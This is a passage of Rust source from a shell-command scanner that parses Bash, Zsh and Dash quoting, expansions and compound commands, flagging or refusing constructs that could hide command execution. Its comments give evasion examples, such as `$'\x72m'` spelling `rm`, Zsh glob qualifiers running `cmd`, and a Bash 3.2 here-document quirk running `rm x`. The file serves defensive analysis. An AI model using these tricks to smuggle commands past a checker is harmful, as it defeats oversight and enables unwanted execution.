        while let Some(c) = self.at(i) {
            match c {
                '\\' => i += 1,
                '\'' => {
                    i = (i + 1..self.s.len())
                        .find(|&j| self.s[j] == '\'')
                        .ok_or("unterminated-quote")?;
                }
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if depth == 0 {
                        return Ok(i + 1);
                    }
                }
                _ => {}
            }
            i += 1;
        }
        Err("invalid-structure")
    }

    fn double_quoted(
        &mut self,
        raw: &mut String,
        value: &mut String,
        nested: &mut Vec<Item>,
    ) -> Result<(), Opaque> {
        raw.push('"');
        self.pos += 1;
        self.in_dquote += 1;
        let r = self.double_quoted_body(raw, value, nested);
        self.in_dquote -= 1;
        r
    }

    fn double_quoted_body(
        &mut self,
        raw: &mut String,
        value: &mut String,
        nested: &mut Vec<Item>,
    ) -> Result<(), Opaque> {
        loop {
            match self.at(self.pos) {
                None => return Err("unterminated-quote"),
                Some('"') => {
                    raw.push('"');
                    self.pos += 1;
                    return Ok(());
                }
                Some('\\') => match self.at(self.pos + 1) {
                    Some(n) if "$`\"\\\n".contains(n) => {
                        if n == '$' || n == '`' {
                            self.flags.payload = true;
                        }
                        raw.push('\\');
                        raw.push(n);
                        if n != '\n' {
                            value.push(n);
                        }
                        self.pos += 2;
                    }
                    Some(_) => {
                        raw.push('\\');
                        value.push('\\');
                        self.pos += 1;
                    }
                    None => return Err("unterminated-quote"),
                },
                Some('$') | Some('`') => {
                    if self.at(self.pos) == Some('$') && self.at(self.pos + 1) == Some('\'') {
                        // `$'` has no special meaning inside double quotes.
                        raw.push('$');
                        value.push('$');
                        self.pos += 1;
                        continue;
                    }
                    self.expansion(raw, value, nested)?;
                }
                Some(c) => {
                    raw.push(c);
                    value.push(c);
                    self.pos += 1;
                }
            }
        }
    }

    /// A `$...` or backtick expansion at `self.pos`.
    fn expansion(
        &mut self,
        raw: &mut String,
        value: &mut String,
        nested: &mut Vec<Item>,
    ) -> Result<(), Opaque> {
        self.tick()?;
        let start = self.pos;
        let c = self.at(start).unwrap();
        let continuation = |i: usize| self.at(i) == Some('\\') && self.at(i + 1) == Some('\n');
        if c == '$'
            && (continuation(start + 1)
                || (self.at(start + 1) == Some('(') && continuation(start + 2)))
        {
            // `$\<newline>(cmd)` is `$(cmd)`, and `$(\<newline>(` may be `$((`.
            return Err("line-continuation");
        }
        if c == '`' {
            self.backtick(nested)?;
        } else {
            match self.at(start + 1) {
                Some('\'') => {
                    // ANSI-C quoting.
                    let mut i = start + 2;
                    let mut decoded = String::new();
                    loop {
                        match self.at(i) {
                            None => return Err("unterminated-quote"),
                            Some('\'') => break,
                            Some('\\') => {
                                let n = self.at(i + 1).ok_or("unterminated-quote")?;
                                match n {
                                    'n' => decoded.push('\n'),
                                    't' => decoded.push('\t'),
                                    'r' => decoded.push('\r'),
                                    'a' => decoded.push('\x07'),
                                    'b' => decoded.push('\x08'),
                                    'e' | 'E' => decoded.push('\x1b'),
                                    'f' => decoded.push('\x0c'),
                                    'v' => decoded.push('\x0b'),
                                    '\\' | '\'' | '"' | '?' => decoded.push(n),
                                    'x' | 'u' | 'U' | '0'..='7' => {
                                        // `\xHH`, `\uHHHH`, `\UHHHHHHHH`, `\NNN`:
                                        // `$'\x72m'` is `rm`.
                                        let (radix, max, from) = match n {
                                            'x' => (16, 2, i + 2),
                                            'u' => (16, 4, i + 2),
                                            'U' => (16, 8, i + 2),
                                            _ => (8, 3, i + 1),
                                        };
                                        let mut j = from;
                                        let mut code = 0u32;
                                        while j < from + max
                                            && self.at(j).is_some_and(|c| c.is_digit(radix))
                                        {
                                            code = code * radix
                                                + self.at(j).unwrap().to_digit(radix).unwrap();
                                            j += 1;
                                        }
                                        if j == from {
                                            // `\x` without digits: Bash keeps it, Zsh drops the `\`.
                                            return Err("ansi-c-escape");
                                        } else {
                                            match char::from_u32(code) {
                                                Some(ch) if code != 0 => decoded.push(ch),
                                                // A NUL ends the string in Bash.
                                                Some(_) => {}
                                                None => return Err("invalid-structure"),
                                            }
                                            i = j;
                                        }
                                        continue;
                                    }
                                    'c' if self
                                        .at(i + 2)
                                        .is_some_and(|x| x.is_ascii_alphabetic()) =>
                                    {
                                        // `\cX`: a control character.
                                        let x = self.at(i + 2).ok_or("unterminated-quote")?;
                                        decoded
                                            .push(char::from_u32(x as u32 & 0x1f).unwrap_or('?'));
                                        i += 3;
                                        continue;
                                    }
                                    _ => {
                                        // Bash keeps an unknown escape, Zsh
                                        // drops the `\`: `$'r\m'` is `rm` in Zsh.
                                        return Err("ansi-c-escape");
                                    }
                                }
                                i += 2;
                            }
                            Some(ch) => {
                                decoded.push(ch);
                                i += 1;
                            }
                        }
                    }
                    if self.text(start + 2, i).contains(['\\', '$', '`']) {
                        self.flags.payload = true;
                    }
                    raw.push_str(&self.text(start, i + 1));
                    value.push_str(&decoded);
                    self.pos = i + 1;
                    return Ok(());
                }
                Some('"') => {
                    self.pos += 1;
                    let mut r = String::from("$");
                    let mut v = String::new();
                    self.double_quoted(&mut r, &mut v, nested)?;
                    raw.push_str(&r);
                    value.push_str(&v);
                    return Ok(());
                }
                Some('(') if self.at(start + 2) == Some('(') => {
                    // Arithmetic expansion: bounded by its matching `))`.
                    let end = self.arithmetic_end(start + 1)?;
                    self.arithmetic(start + 3, end - 2, nested)?;
                    let alternates = self.dash_reading(start + 3, end - 2)?;
                    nested.extend(alternates);
                    self.pos = end;
                }
                Some('[') => {
                    // `$[...]`: old Bash/Zsh arithmetic (Dash leaves it
                    // literal; scanning it is the cautious reading).
                    let mut depth = 0usize;
                    let mut i = start + 1;
                    let end = loop {
                        match self.at(i) {
                            None => return Err("invalid-structure"),
                            Some('[') => depth += 1,
                            Some(']') => {
                                depth -= 1;
                                if depth == 0 {
                                    break i;
                                }
                            }
                            _ => {}
                        }
                        i += 1;
                    };
                    self.arithmetic(start + 2, end, nested)?;
                    self.pos = end + 1;
                }
                Some('(') => {
                    self.pos = start + 2;
                    let before = nested.len();
                    self.substitution(nested)?;
                    if !output_is_known(&nested[before..]) {
                        self.flags.payload = true;
                    }
                }
                Some('{') => {
                    self.pos = start + 2;
                    self.params += 1;
                    let r = self.parameter(nested, self.params);
                    self.params -= 1;
                    r?;
                }
                Some(n) if is_name_start(n) => {
                    let mut i = start + 1;
                    while self.at(i).is_some_and(is_name_char) {
                        i += 1;
                    }
                    if self.at(i) == Some('[') {
                        // Zsh subscripts `$a[x]` without braces (arithmetic).
                        self.flags.sink = true;
                    }
                    self.pos = i;
                }
                Some('$') if matches!(self.at(start + 2), Some('{') | Some('(') | Some('[')) => {
                    // Bash's lexer looks again at the second `$` of `$${`:
                    // `"$${x-"'$(cmd)'"}"` runs `cmd`.
                    raw.push('$');
                    value.push('$');
                    self.pos = start + 1;
                    return Ok(());
                }
                Some(n) if n.is_ascii_digit() || "@*#?$!-".contains(n) => {
                    self.pos = start + 2;
                }
                Some(n) if "~=^+".contains(n) => {
                    // Zsh's `$~x` (glob the value), `$=x` (split it), `$^x`,
                    // `$+x`: an expansion of `x`.
                    let mut i = start + 1;
                    while self.at(i).is_some_and(|c| "~=^+".contains(c)) {
                        i += 1;
                    }
                    if self.text(start + 1, i).contains('~') {
                        // Globbing a value runs its glob qualifiers:
                        // `x='*(e:cmd:)'; echo $~x`.
                        self.flags.eval();
                    }
                    match self.at(i) {
                        Some('{') => {
                            self.pos = i + 1;
                            self.params += 1;
                            let r = self.parameter(nested, self.params);
                            self.params -= 1;
                            r?;
                        }
                        Some(c) if is_name_start(c) => {
                            while self.at(i).is_some_and(is_name_char) {
                                i += 1;
                            }
                            self.pos = i;
                        }
                        _ => {
                            raw.push('$');
                            value.push('$');
                            self.pos = start + 1;
                            return Ok(());
                        }
                    }
                }
                _ => {
                    raw.push('$');
                    value.push('$');
                    self.pos = start + 1;
                    return Ok(());
                }
            }
        }
        let t = self.text(start, self.pos);
        raw.push_str(&t);
        value.push_str(&t);
        Ok(())
    }

    /// Arithmetic text in `a..b`. The shell expands it like double-quoted
    /// text (quotes do not protect `$(...)` there), then evaluates it, and
    /// evaluation expands a variable's value again: `x='a[$(cmd)]'` runs
    /// `cmd` in `$((x))`. Substitutions become commands; a variable or an
    /// expansion makes the text a sink.
    fn arithmetic(&mut self, a: usize, b: usize, nested: &mut Vec<Item>) -> Result<(), Opaque> {
        // Arithmetic nests like a substitution: `$(( $(( 1 )) ))`.
        if self.depth + 1 >= MAX_DEPTH {
            return Err("arithmetic");
        }
        self.depth += 1;
        let result = self.arithmetic_text(a, b, nested);
        self.depth -= 1;
        result
    }

    fn arithmetic_text(
        &mut self,
        a: usize,
        b: usize,
        nested: &mut Vec<Item>,
    ) -> Result<(), Opaque> {
        let mut i = a;
        while i < b {
            self.tick()?;
            match self.at(i) {
                Some('\\') => {
                    if matches!(self.at(i + 1), Some('$') | Some('`')) {
                        self.flags.payload = true;
                    }
                    i += 2;
                }
                Some('$') | Some('`') => {
                    self.flags.sink = true;
                    self.pos = i;
                    let (mut r, mut v) = (String::new(), String::new());
                    if self.at(i) == Some('$') && matches!(self.at(i + 1), Some('\'') | Some('"')) {
                        // Quotes are literal here: `$'` is a `$` then text.
                        i += 1;
                        continue;
                    }
                    self.expansion(&mut r, &mut v, nested)?;
                    if self.pos > b {
                        return Err("invalid-structure");
                    }
                    i = self.pos.max(i + 1);
                }
                Some(c) if is_name_start(c) => {
                    self.flags.sink = true;
                    i += 1;
                }
                _ => i += 1,
            }
        }
        Ok(())
    }

    /// End of `((...))` starting at `p` (the first `(`).
    fn arithmetic_end(&self, p: usize) -> Result<usize, Opaque> {
        let end = self.balanced(p)?;
        if self.at(end - 2) != Some(')') {
            return Err("invalid-structure");
        }
        Ok(end)
    }

    /// The body of `$(...)` or `<(...)`, starting after the `(`.
    fn substitution(&mut self, nested: &mut Vec<Item>) -> Result<(), Opaque> {
        self.tick()?;
        if self.depth + 1 >= MAX_DEPTH {
            return Err("command-substitution");
        }
        let saved_out = std::mem::take(&mut self.out);
        let saved_owners = std::mem::take(&mut self.heredoc_owners);
        let saved_peek = self.peeked.take();
        let saved_dquote = std::mem::take(&mut self.in_dquote);
        let body = self.pos;
        let pending = self.heredocs.len();
        self.depth += 1;
        let result = self.list();
        self.depth -= 1;
        self.in_dquote = saved_dquote;
        let inner = std::mem::replace(&mut self.out, saved_out);
        self.heredoc_owners = saved_owners;
        let (_, stop) = result?;
        if stop != Stop::RParen {
            return Err("command-substitution");
        }
        if self.heredocs.len() > pending {
            // `$(cat <<X)` with the body after the `)`: Zsh and Bash read it
            // differently.
            return Err("heredoc");
        }
        let Tok::Op(Op::RParen, close) = self.next()? else {
            unreachable!()
        };
        if self.matched_close(body).is_some_and(|q| q != close) {
            // Bash 3.2 (macOS's /bin/bash) ends `$(` at the first unbalanced
            // `)`, even in a here-document body, a `case` pattern or a
            // comment: `$(cat <<X\n)\nrm x\nX\n)` runs `rm x` there.
            return Err("command-substitution");
        }
        self.peeked = saved_peek;
        nested.extend(inner);
        Ok(())
    }

    /// Where Bash 3.2 ends a substitution whose body starts at `from`: the
    /// first `)` that balances, skipping quotes and escapes but nothing else.
    /// `None` when it finds none (a syntax error there, so nothing runs).
    fn matched_close(&self, from: usize) -> Option<usize> {
        let mut depth = 1usize;
        let mut i = from;
        let skip_quoted = |i: usize, q: char| -> Option<usize> {
            let mut j = i + 1;
            loop {
                match self.at(j)? {
                    '\\' if q != '\'' => j += 2,
                    c if c == q => return Some(j + 1),
                    _ => j += 1,
                }
            }
        };
        while let Some(c) = self.at(i) {
            match c {
                '\\' => {
                    i += 2;
                    continue;
                }
                '\'' | '"' | '`' => {
                    i = skip_quoted(i, c)?;
                    continue;
                }
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if depth == 0 {
                        return Some(i);
                    }
                }
                _ => {}
            }
            i += 1;
        }
        None
    }

    /// The rest of `${...}` after `${` (or a nested `{`).
    fn parameter(&mut self, nested: &mut Vec<Item>, depth: usize) -> Result<(), Opaque> {
        if depth > MAX_DEPTH {
            return Err("invalid-structure");
        }
        let body = self.pos;
        loop {
            self.tick()?;
            match self.at(self.pos) {
                None => return Err("unterminated-quote"),
                Some('}') => {
                    let text = self.text(body, self.pos);
                    if parameter_evaluates(&text) {
                        self.flags.sink = true;
                    }
                    let name_end = text.find(|c: char| !is_name_char(c)).unwrap_or(text.len());
                    if text[name_end..].starts_with(":=") || text[name_end..].starts_with('=') {
                        // `${x:=text}` assigns.
                        self.bind_text(&text[..name_end]);
                    }
                    let unquoted = text.replace(['\'', '"', '\\'], "");
                    if ["$(", "`", "$["]
                        .iter()
                        .any(|t| unquoted.contains(t) && !text.contains(t))
                    {
                        // Shells differ on which quotes and escapes count
                        // inside `${...}`
                        // (`"$${x/$$'(cmd)'/y}"` runs `cmd` in Bash 3.2):
                        // a substitution spelled once quotes go is unknown.
                        self.flags.eval();
                    }
                    if text.trim_start_matches(['=', '^', '+']).starts_with('~') {
                        // Zsh `${~x}` globs the value, running its glob
                        // qualifiers: `x='*(e:cmd:)'; echo ${~x}`.
                        self.flags.eval();
                    }
                    self.pos += 1;
                    return Ok(());
                }
                Some('\\') => {
                    if matches!(self.at(self.pos + 1), Some('$') | Some('`')) {
                        self.flags.payload = true;
                    }
                    self.pos += 2
                }
                Some('\'') if self.in_dquote > 0 => self.pos += 1,
                // `$'` is no quote inside double quotes either.
                Some('$') if self.in_dquote > 0 && self.at(self.pos + 1) == Some('\'') => {
                    self.pos += 1
                }
                Some('\'') => {
                    let close = (self.pos + 1..self.s.len())
                        .find(|&i| self.s[i] == '\'')
                        .ok_or("unterminated-quote")?;
                    if self.text(self.pos, close).contains(['$', '`']) {
                        self.flags.payload = true;
                    }
                    self.pos = close + 1;
                }
                Some('"') => {
                    let (mut r, mut v) = (String::new(), String::new());
                    self.double_quoted(&mut r, &mut v, nested)?;
                }
                Some('$') | Some('`') => {
                    let (mut r, mut v) = (String::new(), String::new());
                    self.expansion(&mut r, &mut v, nested)?;
                }
                Some('{') => {
                    self.pos += 1;
                    self.parameter(nested, depth + 1)?;
                }
                Some(_) => self.pos += 1,
            }
        }
    }

    fn backtick(&mut self, nested: &mut Vec<Item>) -> Result<(), Opaque> {
        let mut inner = Vec::new();
        let mut i = self.pos + 1;
        loop {
            match self.at(i) {
                None => return Err("command-substitution"),
                Some('`') => break,
                Some('\\') => {
                    let n = self.at(i + 1).ok_or("command-substitution")?;
                    if "$`\\".contains(n) {
                        inner.push(n);
                    } else {
                        inner.push('\\');
                        inner.push(n);
                    }
                    i += 2;
                }
                Some(c) => {
                    inner.push(c);
                    i += 1;
                }
            }
        }
        self.pos = i + 1;
        self.tick()?;
        if self.depth + 1 >= MAX_DEPTH {
            return Err("command-substitution");
        }
        let mut sub = Scanner::new(&inner, self.depth + 1, self.shared);
        let (_, stop) = sub.list().map_err(|_| "command-substitution")?;
        if stop != Stop::Eof || !sub.heredocs.is_empty() {
            return Err("command-substitution");
        }
        self.flags.payload |= sub.flags.payload;
        self.flags.sink |= sub.flags.sink;
        let items: Vec<Item> = sub
            .finish()
            .into_iter()
            .map(|cmd| Item { cmd, span: None })
            .collect();
        if !output_is_known(&items) {
            self.flags.payload = true;
        }
        nested.extend(items);
        Ok(())
    }

    // ---- grammar ---------------------------------------------------------

    fn skip_newlines(&mut self) -> Result<(), Opaque> {
        while matches!(self.peek()?, Tok::Newline) {
            self.next()?;
        }
        Ok(())
    }

    fn peek_keyword(&mut self) -> Result<Option<String>, Opaque> {
        Ok(match self.peek()? {
            Tok::Word(w) if !w.quoted => Some(w.value.clone()),
            _ => None,
        })
    }

    /// Statements until EOF, `)`, a case terminator, a closing keyword or a
    /// stray separator (none of which is consumed).
    fn list(&mut self) -> Result<(usize, Stop), Opaque> {
        let mut count = 0;
        loop {
            self.skip_newlines()?;
            let stop = match self.peek()? {
                Tok::Eof => Some(Stop::Eof),
                Tok::Op(Op::RParen, _) => Some(Stop::RParen),
                Tok::Op(Op::CaseEnd, _) => Some(Stop::CaseEnd),
                Tok::Op(Op::LParen, _) => None,
                Tok::Op(_, _) => Some(Stop::Stray),
                Tok::Word(w)
                    if !w.quoted && (TERMINATORS.contains(&w.value.as_str()) || w.value == "}") =>
                {
                    Some(Stop::Keyword(w.value.clone()))
                }
                _ => None,
            };
            if let Some(stop) = stop {
                return Ok((count, stop));
            }
            self.and_or()?;
            count += 1;
            match self.peek()? {
                Tok::Op(Op::Semi, _) | Tok::Op(Op::Amp, _) => {
                    self.next()?;
                }
                Tok::Newline | Tok::Eof | Tok::Op(Op::RParen, _) | Tok::Op(Op::CaseEnd, _) => {}
                Tok::Word(w)
                    if !w.quoted && (TERMINATORS.contains(&w.value.as_str()) || w.value == "}") => {
                }
                _ => return Err("invalid-structure"),
            }
        }
    }

    fn and_or(&mut self) -> Result<(), Opaque> {
        self.pipeline()?;
        while matches!(self.peek()?, Tok::Op(Op::And, _) | Tok::Op(Op::Or, _)) {
            self.next()?;
            self.skip_newlines()?;
            self.pipeline()?;
        }
        Ok(())
    }

    fn pipeline(&mut self) -> Result<(), Opaque> {
        while self.peek_keyword()?.as_deref() == Some("!") {
            self.next()?;
        }
        self.command()?;
        while matches!(self.peek()?, Tok::Op(Op::Pipe, _) | Tok::Op(Op::PipeAmp, _)) {
            self.next()?;
            self.skip_newlines()?;
            self.command()?;
        }
        Ok(())
    }

    fn require_command_start(&mut self) -> Result<(), Opaque> {
        match self.peek()? {
            Tok::Word(w)
                if !w.quoted && (TERMINATORS.contains(&w.value.as_str()) || w.value == "}") =>
            {
                Err("invalid-structure")
            }
            Tok::Word(_) | Tok::Redir(_) | Tok::Op(Op::LParen, _) => Ok(()),
            _ => Err("invalid-structure"),
        }
    }

    fn command(&mut self) -> Result<(), Opaque> {
        self.require_command_start()?;
        if self.compound > MAX_COMPOUND_DEPTH {
            return Err("compound-command");
        }
        if let Tok::Op(Op::LParen, p) = *self.peek()? {
            self.next()?;
            if self.at(p + 1) == Some('\\') && self.at(p + 2) == Some('\n') {
                // `(\<newline>(` may be the arithmetic command `((`.
                return Err("line-continuation");
            }
            if self.at(p + 1) == Some('(') && self.pos == p + 1 && !self.dash {
                return self.arithmetic_command(p);
            }
            self.compound += 1;
            let (n, stop) = self.list()?;
            self.compound -= 1;
            if stop != Stop::RParen || n == 0 {
                return Err("invalid-structure");
            }
            self.next()?;
            return self.trailing_redirects();
        }
        let keyword = self.peek_keyword()?;
        match keyword.as_deref() {
            Some("{") => {
                self.next()?;
                self.block("}")?;
                self.trailing_redirects()
            }
            Some("if") => {
                self.next()?;
                self.if_clause()?;
                self.trailing_redirects()
            }
            Some("while") | Some("until") => {
                self.next()?;
                self.block("do")?;
                self.block("done")?;
                self.trailing_redirects()
            }
            Some("for") | Some("select") => {
                self.next()?;
                self.for_clause()?;
                self.trailing_redirects()
            }
            Some("case") => {
                self.next()?;
                self.case_clause()?;
                self.trailing_redirects()
            }
            Some("[[") => {
                self.next()?;
                self.conditional()?;
                self.trailing_redirects()
            }
            Some("function") => {
                self.next()?;
                match self.next()? {
                    Tok::Word(_) => {}
                    _ => return Err("compound-command"),
                }
                self.skip_blanks();
                if self.at(self.pos) == Some('(') {
                    self.pos += 1;
                    self.skip_blanks();
                    if self.at(self.pos) != Some(')') {
                        return Err("compound-command");
                    }
                    self.pos += 1;
                }
                self.function_body()
            }
            _ => self.simple_command(),
        }
    }

    /// A list ending in `end`, with at least one statement.
    fn block(&mut self, end: &str) -> Result<(), Opaque> {
        self.compound += 1;
        let (n, stop) = self.list()?;
        self.compound -= 1;
        if n == 0 || stop != Stop::Keyword(end.into()) {
            return Err("compound-command");
        }
        self.next()?;
        Ok(())
    }

    fn if_clause(&mut self) -> Result<(), Opaque> {
        self.block("then")?;
        loop {
            self.compound += 1;
            let (n, stop) = self.list()?;
            self.compound -= 1;
            if n == 0 {
                return Err("compound-command");
            }
            match stop {
                Stop::Keyword(k) if k == "elif" => {
                    self.next()?;
                    self.block("then")?;
                }
                Stop::Keyword(k) if k == "else" => {
                    self.next()?;
                    return self.block("fi");
                }
                Stop::Keyword(k) if k == "fi" => {
                    self.next()?;
                    return Ok(());
                }
                _ => return Err("compound-command"),
            }
        }
    }

    fn for_clause(&mut self) -> Result<(), Opaque> {
        if let Tok::Op(Op::LParen, p) = *self.peek()? {
            if self.at(p + 1) != Some('(') {
                return Err("compound-command");
            }
            self.peeked = None;
            let end = self.arithmetic_end(p)?;
            let mut inner = Vec::new();
            self.arithmetic(p + 2, end - 2, &mut inner)?;
            self.out.extend(inner);
            self.pos = end;
        } else {
            let mut names = Vec::new();
            match self.next()? {
                Tok::Word(w) if !w.quoted && w.raw.chars().all(is_name_char) => names.push(w.raw),
                _ => return Err("compound-command"),
            }
            // Zsh takes several names: `for k v in a 1 b 2`.
            while let Tok::Word(w) = self.peek()? {
                if w.quoted
                    || w.raw.is_empty()
                    || !w.raw.chars().all(is_name_char)
                    || ["in", "do"].contains(&w.raw.as_str())
                {
                    break;
                }
                let Tok::Word(w) = self.next()? else {
                    unreachable!()
                };
                names.push(w.raw);
            }
            let mut numeric = true;
            if let Tok::Op(Op::LParen, _) = self.peek()? {
                // Zsh's `for x (a b) ...`: the words, then the body.
                self.next()?;
                loop {
                    match self.next()? {
                        Tok::Word(w) => self.loop_word(w, &mut numeric),
                        Tok::Newline => {}
                        Tok::Op(Op::RParen, _) => break,
                        _ => return Err("compound-command"),
                    }
                }
            } else {
                self.skip_newlines()?;
                if self.peek_keyword()?.as_deref() == Some("in") {
                    self.next()?;
                    loop {
                        match self.next()? {
                            Tok::Word(w) => self.loop_word(w, &mut numeric),
                            Tok::Op(Op::Semi, _) | Tok::Newline => break,
                            _ => return Err("compound-command"),
                        }
                    }
                } else {
                    // The positional parameters.
                    numeric = false;
                }
            }
            if !numeric {
                for n in names {
                    self.bind_text(&n);
                }
            }
        }
        if let Tok::Op(Op::Semi, _) = self.peek()? {
            self.next()?;
        }
        self.skip_newlines()?;
        match self.peek_keyword()?.as_deref() {
            Some("do") => {
                self.next()?;
                self.block("done")
            }
            Some("{") => {
                self.next()?;
                self.block("}")
            }
            // Zsh's short form: one pipeline list is the body
            // (`for x (a b) rm $x`, `for x in a b; rm $x`). Bash and Dash
            // refuse it, so reading it as Zsh does only adds commands.
            _ => {
                self.compound += 1;
                let r = self.and_or();
                self.compound -= 1;
                r
            }
        }
    }

    /// A word a `for` loop binds its name to.
    fn loop_word(&mut self, w: Word, numeric: &mut bool) {
        if !w.quoted && w.raw.contains(['*', '?', '[']) {
            // File names, which a repository chooses.
            self.flags.payload = true;
        }
        *numeric &= integer_literal(&w.raw);
        self.out.extend(w.nested)
    }

    /// Records that the script may give variable `name` text (not just a
    /// number): see [`Shared::text_vars`].
    fn bind_text(&self, name: &str) {
        let name = name.split(['[', '+', '=']).next().unwrap_or(name);
        if !name.is_empty() && !self.shared.text_vars.borrow().contains(name) {
            self.shared.text_vars.borrow_mut().insert(name.to_string());
        }
    }

    /// An assignment `raw` (`value` with quotes removed) to a variable in
    /// [`COMMAND_VARS`], kept for [`command_var`].
    fn note_command_var(&self, raw: &str, value: &str) {
        let name = raw.split(['=', '[']).next().unwrap_or(raw);
        let name = name.trim_end_matches('+');
        if COMMAND_VARS.contains(&name) || name.starts_with("GIT_CONFIG_") {
            self.shared
                .command_vars
                .borrow_mut()
                .push((raw.to_string(), value.to_string()));
        }
    }

    /// An assignment word `name=value` (raw): its name holds text unless
    /// the value is a number or an arithmetic expansion.
    fn bind_assignment(&self, raw: &str) {
        if let Some((name, value)) = raw.split_once('=') {
            if !integer_literal(value) && !arithmetic_only(value) {
                self.bind_text(name);
            }
        }
    }

    fn case_clause(&mut self) -> Result<(), Opaque> {
        match self.next()? {
            Tok::Word(w) => self.out.extend(w.nested),
            _ => return Err("compound-command"),
        }
        self.skip_newlines()?;
        if self.peek_keyword()?.as_deref() != Some("in") {
            return Err("compound-command");
        }
        self.next()?;
        loop {
            self.skip_newlines()?;
            if self.peek_keyword()?.as_deref() == Some("esac") {
                self.next()?;
                return Ok(());
            }
            if let Tok::Op(Op::LParen, _) = self.peek()? {
                self.next()?;
            }
            loop {
                match self.next()? {
                    Tok::Word(w) => self.out.extend(w.nested),
                    _ => return Err("compound-command"),
                }
                match self.next()? {
                    Tok::Op(Op::Pipe, _) => continue,
                    Tok::Op(Op::RParen, _) => break,
                    _ => return Err("compound-command"),
                }
            }
            self.compound += 1;
            let (_, stop) = self.list()?;
            self.compound -= 1;
            match stop {
                Stop::CaseEnd => {
                    self.next()?;
                }
                Stop::Keyword(k) if k == "esac" => {}
                _ => return Err("compound-command"),
            }
        }
    }

    /// `[[ ... ]]`: not a command of its own, but substitutions inside run.
    fn conditional(&mut self) -> Result<(), Opaque> {
        debug_assert!(self.peeked.is_none());
        loop {
            match self.lex(true)? {
                Tok::Word(w) if !w.quoted && w.value == "]]" => return Ok(()),
                Tok::Word(w) => {
                    // Arithmetic comparisons evaluate both operands; `-v`
                    // evaluates a subscript.
                    if !w.quoted
                        && ["-eq", "-ne", "-lt", "-le", "-gt", "-ge", "-v"]
                            .contains(&w.value.as_str())
                    {
                        self.flags.sink = true;
                    }
                    self.out.extend(w.nested)
                }
                Tok::Newline => {}
                _ => return Err("invalid-structure"),
            }
        }
    }

    fn arithmetic_command(&mut self, p: usize) -> Result<(), Opaque> {
        let end = self.arithmetic_end(p)?;
        let mut inner = Vec::new();
        self.arithmetic(p + 2, end - 2, &mut inner)?;
        self.pos = end;
        let text = self.text(p, end);
        self.out.push(Item {
            cmd: Command {
                words: vec![text.clone()],
                raw_words: vec![text],
                arithmetic: true,
                ..Default::default()
            },
            span: Some((p, end)),
        });
        self.out.extend(inner);
        let alternates = self.dash_reading(p + 2, end - 2)?;
        self.out.extend(alternates);
        self.trailing_redirects()
    }

    /// `((text))` as Dash reads it: subshells running `text`. Zsh reads
    /// `((text))` and `$((text))` that way too when `text` is not arithmetic.
    fn dash_reading(&mut self, a: usize, b: usize) -> Result<Vec<Item>, Opaque> {
        self.tick()?;
        if self.depth + 1 >= MAX_DEPTH {
            // Too deep to read the subshells: refuse rather than skip them.
            return Err("arithmetic");
        }
        // Dash removes line continuations before reading.
        let mut chars: Vec<char> = Vec::with_capacity(b - a);
        let mut i = a;
        while i < b {
            match (self.s[i], self.s[..b].get(i + 1)) {
                ('\\', Some('\n')) => i += 2,
                ('\\', Some(&n)) => {
                    chars.extend(['\\', n]);
                    i += 2;
                }
                (c, _) => {
                    chars.push(c);
                    i += 1;
                }
            }
        }
        let key = (chars, self.depth);
        self.charge(key.0.len());
        if let Some(cmds) = self.shared.dash.borrow().get(&key) {
            // Copying them is work too: nested readings copy them again.
            self.charge(cmds.iter().map(command_size).sum());
            self.tick()?;
            return Ok(cmds
                .iter()
                .map(|cmd| Item {
                    cmd: cmd.clone(),
                    span: None,
                })
                .collect());
        }
        let cmds = self.dash_commands(&key.0);
        self.tick()?;
        self.shared.dash.borrow_mut().insert(key, cmds.clone());
        Ok(cmds
            .into_iter()
            .map(|cmd| Item { cmd, span: None })
            .collect())
    }

    /// The commands of [`Scanner::dash_reading`], each marked
    /// [`Command::alternate`].
    fn dash_commands(&self, chars: &[char]) -> Vec<Command> {
        let mut out = Vec::new();
        let mut sub = Scanner::new(chars, self.depth + 1, self.shared);
        sub.dash = true;
        if !matches!(sub.list(), Ok((_, Stop::Eof))) || !sub.heredocs.is_empty() {
            // Zsh also falls back to subshells when the text is not
            // arithmetic, with grammar this scanner does not read: take
            // every run between separators as a possible command.
            let text: String = chars.iter().collect();
            for part in text.split(|c: char| ";&|()\n`".contains(c)) {
                // Quotes and escapes removed, roughly: `touc\h` is `touch`.
                let words: Vec<String> = part
                    .split_whitespace()
                    .map(|w| w.replace(['\\', '\'', '"'], ""))
                    .filter(|w| !w.is_empty())
                    .collect();
                if words.is_empty() {
                    continue;
                }
                out.push(Command {
                    resource: words.join(" "),
                    raw_words: words.clone(),
                    words,
                    alternate: true,
                    ..Default::default()
                });
            }
            return out;
        }
        // Nested `$((` repeat the same alternates at every level: keep one
        // of each, or their number doubles per level.
        let mut seen = std::collections::HashSet::new();
        for mut cmd in sub.finish() {
            cmd.alternate = true;
            cmd.writes.clear();
            if seen.insert(cmd.clone()) {
                out.push(cmd);
            }
        }
        out
    }

    fn function_body(&mut self) -> Result<(), Opaque> {
        self.skip_newlines()?;
        match self.peek()? {
            Tok::Op(Op::LParen, _) => {}
            Tok::Word(w)
                if !w.quoted
                    && ["{", "if", "for", "while", "until", "case", "[[", "select"]
                        .contains(&w.value.as_str()) => {}
            _ => return Err("compound-command"),
        }
        self.compound += 1;
        let r = self.command();
        self.compound -= 1;
        r
    }

    /// Redirects after a compound command, kept as a resource of their own.
    fn trailing_redirects(&mut self) -> Result<(), Opaque> {
        let mut first: Option<(usize, usize)> = None;
        let mut end = 0;
        let mut nested = Vec::new();
        let mut heredoc = false;
        let mut writes = Vec::new();
        while let Tok::Redir(_) = self.peek()? {
            let Tok::Redir(r) = self.next()? else {
                unreachable!()
            };
            first.get_or_insert((r.start, r.op_end));
            end = r.end;
            heredoc |= r.heredoc;
            nested.extend(r.nested);
            writes.extend(r.write);
        }
        if let Some((start, op_end)) = first {
            self.push(
                Command {
                    redirect_prefix_end: Some(op_end - start),
                    writes,
                    ..Default::default()
                },
                start,
                end,
                heredoc,
            );
        }
        self.out.extend(nested);
        Ok(())
    }

    fn push(&mut self, cmd: Command, start: usize, mut end: usize, heredoc: bool) {
        // The body may already have been read, when the newline ending the
        // command was looked at before the command was complete.
        let read = heredoc && self.heredocs.is_empty() && self.heredoc_end.is_some();
        if read {
            end = self.heredoc_end.take().unwrap();
        } else if heredoc {
            self.heredoc_owners.push(self.out.len());
        }
        self.out.push(Item {
            cmd,
            span: Some((start, end)),
        });
        if read {
